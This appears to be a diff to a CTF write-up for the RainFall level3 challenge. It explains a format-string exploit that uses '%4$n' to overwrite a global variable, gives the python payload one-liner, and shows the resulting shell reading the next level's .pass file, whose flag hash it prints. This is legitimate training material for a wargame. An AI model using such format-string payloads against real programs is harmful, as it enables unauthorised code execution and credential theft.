@@ -3,7 +3,7 @@ get the binary on host
 
 decompile using ghidra
 
-When we disasemble the main function, we can see the main call a v()function 
+When we disasemble the main function, we can see the main call a v() function 
 
  0x08048520 <+6>:     call   0x80484a4 <v>
 
@@ -54,11 +54,10 @@ So we can count 3 addresses before m, and 4 including it. Now we can build our e
 python -c "print '\x8c\x98\x04\x08' + 'z'* 60 + '%4\$n'" > /tmp/file
 
 we write 60 bytes, the '4\$' inf the '%n' modifier is here to tell the fonction to skip the 3 addresses so we are a the good position in the stack.\
-60 bytes + \x8c\x98\x04\x08 wich is 4 bytes makes 64 written to the m variable address (\x8c\x98\x04\x08)\
-
+60 bytes + \x8c\x98\x04\x08 wich is 4 bytes makes 64 written to the m variable address (\x8c\x98\x04\x08)
 ```
-level3@RainFall:~$ cat /tmp/file - | ./level3
-�zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '\x90' * 60 + '%4\$n'" > /tmp/exploit_3 ; cat /tmp/exploit_3 - | ./level3`
+�������������������������������������������������������������
 Wait what?!
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
